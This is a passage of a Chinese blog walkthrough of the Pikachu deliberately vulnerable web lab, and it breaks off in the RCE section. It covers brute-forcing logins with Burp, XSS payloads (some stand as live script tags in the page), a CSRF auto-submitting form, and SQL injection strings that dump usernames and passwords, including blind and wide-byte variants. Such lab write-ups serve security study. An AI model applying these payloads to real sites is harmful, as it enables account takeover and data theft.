<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Pikachu靶场全通关思路</title>
      <link href="/2023/07/30/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%E6%80%9D%E8%B7%AF/"/>
      <url>/2023/07/30/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="一、基于表单的暴力破解"><a href="#一、基于表单的暴力破解" class="headerlink" title="一、基于表单的暴力破解"></a>一、基于表单的暴力破解</h3><p>本题打开后为一个简单的登录界面</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312139255.png"></p><p>无论是用户名还是密码我们都是无从知晓的，所以需要通过BP来爆破出其各自的值</p><p>先随便输入用户名和密码通过BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312139452.png"></p><p>然后发送给BP的Intruder(测试器)，利用其中的Clusterbomb(集束炸弹)分别对用户名和密码进行爆破，得到用户名和密码分别为admin&#x2F;123456</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140847.png"></p><p>不过本题也不只这一个用户名和密码。</p><h3 id="二、验证码绕过-on-server"><a href="#二、验证码绕过-on-server" class="headerlink" title="二、验证码绕过(on server)"></a>二、验证码绕过(on server)</h3><p>本题在原本的用户名和密码上多了一个验证码，同样的先用BP进行抓包，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140543.png"></p><p>通过抓包重发，发现只要验证码可以重复使用，即当第一次验证码输对以后，只需要去爆破用户名和密码即可，为方便即默认用户名为admin(也可以选择和第一题一样)，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140211.png"></p><p>得到密码为123456，登录成功</p><h3 id="三、验证码绕过-on-client"><a href="#三、验证码绕过-on-client" class="headerlink" title="三、验证码绕过(on client)"></a>三、验证码绕过(on client)</h3><p>先进行BP抓包，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140290.png"></p><p>由于本题是前端验证，所以即使我们将vcode那一处给删除掉，回显仍然判断为用户名和密码不存在</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140627.png"></p><p>所以接下来只需要去爆破出密码即可</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140251.png"></p><h3 id="四、token防爆破"><a href="#四、token防爆破" class="headerlink" title="四、token防爆破"></a>四、token防爆破</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140934.png"></p><p>发现当修改密码再发送时会出现另一种回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141962.png"></p><p>即每个数据包都被添加了token验证机制，尝试使用Intruder(测试器)中的Pitchfork(音叉)</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141334.png"></p><p>然后在选项中进行修改</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141085.png"></p><p>找到Grep-Extract进行添加</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141742.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141767.png"></p><p>即从 <strong>value:”</strong> 开始到 <strong>“ &#x2F;&gt;\n\n                <label></strong> 结束</p><p>然后再重定向中选择 <strong>总是</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141966.png"></p><p>转到有效载荷，有效负载集为1时即为爆破密码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141239.png"></p><p>有效负载集选为2，并在有效载荷类型中选择    Recursive grep(递归搜索) </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141151.png"></p><p>开始攻击</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141964.png"></p><h2 id="Cross-Site-Scripting-（XSS）"><a href="#Cross-Site-Scripting-（XSS）" class="headerlink" title="Cross-Site Scripting （XSS）"></a>Cross-Site Scripting （XSS）</h2><h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：<br>                          1.反射性XSS;<br>                          2.存储型XSS;<br>                          3.DOM型XSS;</p><p>​                        XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。<br>​                        XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。<br>​                        形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>​                        因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:<br>​                         输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;<br>​                         输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</p></blockquote><h3 id="二、反射型xss-get"><a href="#二、反射型xss-get" class="headerlink" title="二、反射型xss(get)"></a>二、反射型xss(get)</h3><p>本题有着长度限制，不过可以通过F12进行修改，或者先随便输入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142096.png"></p><p>然后通过上方url中的message构成XSS恶意语句，得到弹窗</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142803.png"></p><h3 id="三、反射性xss-post"><a href="#三、反射性xss-post" class="headerlink" title="三、反射性xss(post)"></a>三、反射性xss(post)</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142528.png"></p><p>首先他想让你登录，不过用户名和密码就是暴力破解时得到的，登录成功后，直接在输入框中构造XSS恶意语句</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142921.png"></p><p>或者 输入此构造伪链接 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(/我是弹窗/)&gt;别点我没结果&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142923.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142497.png"></p><h3 id="四、存储型xss"><a href="#四、存储型xss" class="headerlink" title="四、存储型xss"></a>四、存储型xss</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142139.png"></p><p>本题直接在留言版上写下XSS恶意语句，然后每次点开后就会出现弹窗</p><script>alert('我是弹窗')</script><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312143961.png"></p><p>千万不要在留言板上写这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot; &gt;window.location.href=&quot;http://www.baidu.com&quot;;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>不然后面你每次点开存储型XSS就会自动跳转百度</p><h3 id="五、DOM型xss"><a href="#五、DOM型xss" class="headerlink" title="五、DOM型xss"></a>五、DOM型xss</h3><p>在源码中我们可以找到这个语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#x27;&quot;+str+&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;;</span><br></pre></td></tr></table></figure><p>即我们输入框中的内容就是str，所以我们需要在输入框中输入一个内容，使之达到闭合，以此出现弹窗</p><p>构造语句 <strong>‘onclick&#x3D;alert(‘我是弹窗’)&gt;</strong></p><p>构造后的语句为 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&#x27;&#x27;onclick=alert(&#x27;我是弹窗&#x27;)&gt;&#x27;&gt;what do you see?&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312143436.png"></p><p>点击下方蓝体，得到弹窗</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312143114.png"></p><h3 id="六、DOM型xss-x"><a href="#六、DOM型xss-x" class="headerlink" title="六、DOM型xss-x"></a>六、DOM型xss-x</h3><p>和第五题一样，在输入框中输入 <strong>‘onclick&#x3D;alert(‘我是弹窗’)&gt;</strong></p><p>然后下面出现的蓝体文字多点几下就出弹窗了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312143667.png"></p><h3 id="七、xss之盲打"><a href="#七、xss之盲打" class="headerlink" title="七、xss之盲打"></a>七、xss之盲打</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312143034.png"></p><p>有框你不打？</p><script>alert('我是弹窗')</script><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312143091.png"></p><p>然后本题有着后台登录地址，登录进去看看</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144578.png"></p><p>然后就会被弹了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144537.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144304.png"></p><p>盲打的本意就是我们也不知道这个是否会触发，而当管理员打开后台后自动执行xss出现这个弹窗这说明盲打成功</p><h3 id="八、xss之过滤"><a href="#八、xss之过滤" class="headerlink" title="八、xss之过滤"></a>八、xss之过滤</h3><blockquote><p>xss过滤绕过技巧</p><p>1、改变大小写</p><p>2、关闭标签</p><p>3、使用hex编码绕过</p><p>4、绕过magic_quotes_gpc</p><p>5、利用&lt;&gt;标记注射Html&#x2F;Javascript</p><p>6、利用HTML标签属性值执行XSS</p><p>7、空格&#x2F;回车&#x2F;Tab</p><p>8、对标签属性值进行转码</p><p>9、产生自己的事件</p><p>10、利用CSS跨站剖析<br>这里不做赘述，如果想要了解，可以访问[大佬博客](<a href="https://blog.csdn.net/free_xiaochen/article/details/82289316">XSS篇——XSS过滤绕过技巧_xss &lt;被过滤了怎么构造命令_free_xiaochen的博客-CSDN博客</a>)</p></blockquote><p>本题经过尝试是字母大小写绕过</p><Script>alert('我是弹窗')</Script><p>这样修改一下就可以触发弹窗</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144494.png"></p><h3 id="九、xss之htmlspecialchars"><a href="#九、xss之htmlspecialchars" class="headerlink" title="九、xss之htmlspecialchars"></a>九、xss之htmlspecialchars</h3><p><strong>htmlspecialchars定义和用法</strong></p><blockquote><p>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。</p><p>预定义的字符是：</p><ul><li>&amp; （和号）成为 &amp;</li><li>“ （双引号）成为 &quot;</li><li>‘ （单引号）成为 ‘</li><li>&lt; （小于）成为 &lt;</li><li>&gt; （大于）成为 &gt;</li></ul><p><strong>提示：</strong>要把特殊的 HTML 实体转换回字符，请使用 <a href="https://www.runoob.com/php/func-string-htmlspecialchars-decode.html">htmlspecialchars_decode()</a> 函数。</p></blockquote><p>所以当我们输入xss恶意语句时，会发现被转换为实体符号</p><p><img src="C:\Users\HXY\AppData\Roaming\Typora\typora-user-images\image-20230730113247554.png" alt="image-20230730113247554"></p><p>所以我们需要构造如下的语句</p><p><strong>‘οnclick&#x3D;’alert(“我是弹窗”)’</strong>  or  <strong>‘onclick&#x3D;’alert(&#x2F;htmlspecialchars&#x2F;)’</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144582.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144485.png"></p><h3 id="十、xss之href输出"><a href="#十、xss之href输出" class="headerlink" title="十、xss之href输出"></a>十、xss之href输出</h3><p>本题中如果仍使用正常的xss恶意语句，虽可以得到蓝字回显，但点进去却只是403，经测试无论是双写绕过还是大小写等都不可，这里就可以使用另一种方法，js伪协议绕过</p><p>构造  <strong>javascript:alert(“我是弹窗”)</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144368.png"></p><h3 id="十一、xss之js输出"><a href="#十一、xss之js输出" class="headerlink" title="十一、xss之js输出"></a>十一、xss之js输出</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144286.png"></p><p>先随便输入，得到回显，然后通过源代码找到这一处位置</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $ms=<span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>($ms.<span class="property">length</span> != <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>($ms == <span class="string">&#x27;tmac&#x27;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&#x27;#fromjs&#x27;</span>).<span class="title function_">text</span>(<span class="string">&#x27;tmac确实厉害,看那小眼神..&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;<span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//            alert($ms);</span></span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&#x27;#fromjs&#x27;</span>).<span class="title function_">text</span>(<span class="string">&#x27;无论如何不要放弃心中所爱..&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以得知$ms即是我们在文本框写入的内容， 且此内容在js标签内，所以我们需要闭合一下</p><p>构造  <strong></script><script>alert("我是弹窗")</script></strong></p><p>得到弹窗</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312145532.png"></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="一、概述-1"><a href="#一、概述-1" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote><p>CSRF(跨站请求伪造)概述</p><p>​                        Cross-site request forgery  简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。<br>​      <strong>CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</strong>                    </p><p>​      因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<br>​                        –对敏感信息的操作增加安全的token；<br>​                        –对敏感信息的操作增加安全的验证码；<br>​                        –对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p></blockquote><h3 id="二、CSRF-get"><a href="#二、CSRF-get" class="headerlink" title="二、CSRF(get)"></a>二、CSRF(get)</h3><p>根据提示，得到了几个用户，我们如概述那般，先登录vince用户</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312145987.png"></p><p>修改vince用户的个人信息并利用BP抓包!<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312146599.png"></p><p>发现没有token验证，然后将add修改为chain80</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312146030.png"></p><p>然后复制url <strong>&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;boy&amp;phonenum&#x3D;18626545453&amp;add&#x3D;chain80&amp;email&#x3D;vince%40pikachu.com&amp;submit&#x3D;submit</strong></p><p>我们再登录kobe用户</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312146037.png"></p><p>修改url，kobe的信息被修改</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312146544.png"></p><h3 id="三、CSRF-POST"><a href="#三、CSRF-POST" class="headerlink" title="三、CSRF(POST)"></a>三、CSRF(POST)</h3><p>与上题差不多，不过此题是以post传参，我们先登一个lili用户</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301456781.png"></p><p>然后利用BP抓包修改一下</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301457290.png"></p><p>因为post无法像get那般，所以我们需要自己创建一个恶意站点，在pikachu文件夹vul&#x2F;csrf&#x2F;csrfpost下创建一个html文件，使被攻击用户点击</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;postsubmit&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;csrf_post_edit.php&quot;</span>&gt;</span>  //这一处因人而异</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;girl&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;18656565545&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;US&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;lili@pikachu.com&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后我们登录vince用户</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301503808.png"></p><p>访问这个html文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301509363.png"></p><h3 id="四、CSRF-Token"><a href="#四、CSRF-Token" class="headerlink" title="四、CSRF(Token)"></a>四、CSRF(Token)</h3><p>由于token回显在每次发送请求都是不一样且完全随机的，且后台会对每次生成的token进行验证， 故我们无法通过伪造URL使被攻击者遭到CSRF攻击，以本人目前能力，无法复现</p><p>由此也可见。token保护是一个很好防御CSRF的方法。</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="一、概述-2"><a href="#一、概述-2" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote><p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。       </p><p>​                 在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：<br>​                    1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；<br>​                    2.使用参数化（Parameterized Query 或 Parameterized Statement）；<br>​                    3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!                    </p></blockquote><h3 id="二、数字型注入-post"><a href="#二、数字型注入-post" class="headerlink" title="二、数字型注入(post)"></a>二、数字型注入(post)</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301520325.png"></p><p>数字分别代表的就是CSRF中那六个用户，我们直接抓包拼接sql语句</p><p>因为只是数字型，直接联合查询就好</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301523787.png"></p><h3 id="三、字符型注入（get）"><a href="#三、字符型注入（get）" class="headerlink" title="三、字符型注入（get）"></a>三、字符型注入（get）</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301524891.png"></p><p>我们需要判断是单引号闭合还是双引号闭合，</p><p>当我们输入双引号时</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301526744.png"></p><p>当我们输入单引号时</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301527016.png"></p><p>构造语句      <strong>1’ union select username,password from pikachu.users#</strong></p><p>得到回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301528761.png"></p><h3 id="四、搜索型注入"><a href="#四、搜索型注入" class="headerlink" title="四、搜索型注入"></a>四、搜索型注入</h3><p>本次注入，就是你还需要去判断一下有几个列</p><p>当我们判断它有三个列时</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301530849.png"></p><p>判断它有四个列时</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301531100.png"></p><p>所以本题有三个列，则 在第三题的基础上再加修改</p><p>构造语句  <strong>1’ union select username,password,3 from pikachu.users#</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301532817.png"></p><h3 id="五、xx型注入"><a href="#五、xx型注入" class="headerlink" title="五、xx型注入"></a>五、xx型注入</h3><p>根据提示，这题就是不管他是什么型，使你所写的sql语句能闭合上，</p><p>即构造 <strong>1’) union select username,password from pikachu.users#</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301544492.png"></p><h3 id="六、”insert-x2F-update”注入"><a href="#六、”insert-x2F-update”注入" class="headerlink" title="六、”insert&#x2F;update”注入"></a>六、”insert&#x2F;update”注入</h3><p>我们需要先注册一个账号</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301545889.png"></p><p>而根据本题题目 insert和update其实都是sql语句的一种，前者用于添加，后者用于修改</p><p>进行BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301547592.png"></p><p>然后构造语句进行报错注入，此时不能再在语句后加入注释符</p><p><strong>know5’ or updatexml(1,concat(0x7e,database()),0) or ‘</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301553046.png"></p><p>修改个人信息也是如此</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301554840.png"></p><h3 id="七、”delete注入”"><a href="#七、”delete注入”" class="headerlink" title="七、”delete注入”"></a>七、”delete注入”</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301555856.png"></p><p>点击删除后抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301556185.png"></p><p>由于本题编码问题，所以我们需要用+替换空格，与上题一样，利用报错注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301559576.png"></p><h3 id="八、http头注入"><a href="#八、http头注入" class="headerlink" title="八、http头注入"></a>八、http头注入</h3><p>即http头的某个值带入sql语句使其注入</p><p>进行BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301628554.png"></p><p>单引号出现报错，所以构造报错注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301629597.png"></p><h3 id="九、布尔盲注"><a href="#九、布尔盲注" class="headerlink" title="九、布尔盲注"></a>九、布尔盲注</h3><p>利用substr构造语句，结合我们在刚才注入时已知的那几个用户，可以通过此语句查询到他们的信息</p><p>lili’ and ascii(substr(database(),1,1))&#x3D;112#</p><p>意思就是判断数据库名称的第一个字符是否等于小写字母<code>p</code>，如果相等，则返回True（即条件成立），否则返回False（即条件不成立）。。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301636136.png"></p><h3 id="十、时间盲注"><a href="#十、时间盲注" class="headerlink" title="十、时间盲注"></a>十、时间盲注</h3><p>时间盲注一般通过if语句，通过延迟的信息进行判断</p><p><strong>1’ and if(substr(database(),1,1)&#x3D;’p’,sleep(5),null)#</strong> 即<code>substr(database(), 1, 1)</code> 是函数 <code>database()</code> 截取第一个字符   **if(substr(database(),1,1)&#x3D;’p’,sleep(5),null)# ** 如果第一个字符是 ‘p’，则执行 <code>sleep(5)</code> 延迟5秒；反之则返回null</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301648294.png"></p><p><strong>lili’ and if ((substr(database(),1,1))&#x3D;’p’,sleep&#x3D;(5),null)#</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301648804.png"></p><h3 id="十一、宽字节注入"><a href="#十一、宽字节注入" class="headerlink" title="十一、宽字节注入"></a>十一、宽字节注入</h3><p>使用BP抓包</p><p>由于魔术引号的存在，需要在其前面加一个%df</p><p>即构造如下语句 <strong>1%df’ union select username,password from pikachu.users#</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301655472.png"></p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="一、概述-3"><a href="#一、概述-3" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote><p><strong>远程系统命令执行</strong><br>        一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口<br>         比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。而如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的”收获”-_-                    </p><p>  <strong>远程代码执行</strong><br>                        同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。                   </p><p>​                        不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。                    </p><p>​                        因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。                    </p></blockquote><h3 id="二、exec-“ping”"><a href="#二、exec-“ping”" class="headerlink" 